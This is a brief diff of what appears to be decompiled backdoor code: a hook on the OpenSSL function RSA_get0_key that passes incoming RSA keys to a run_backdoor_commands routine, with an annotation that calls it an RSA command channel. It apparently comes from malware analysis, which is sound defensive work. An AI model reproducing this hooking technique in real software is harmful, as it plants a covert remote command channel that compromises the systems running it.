@@ -22,6 +22,7 @@ void hook_RSA_get0_key(RSA *r,BIGNUM **n,BIGNUM **e,BIGNUM **d)
      (orig_RSA_get0_key = global_ctx->imported_funcs->RSA_get0_key_orig,
      orig_RSA_get0_key != (pfn_RSA_get0_key_t)0x0)) {
     if (r != (RSA *)0x0) {
+      do_orig_flag = TRUE;
       // AutoDoc: Treat the modulus/exponent fetch as another opportunity to drive the RSA command channel.
       run_backdoor_commands(r,global_ctx,&do_orig_flag);
     }
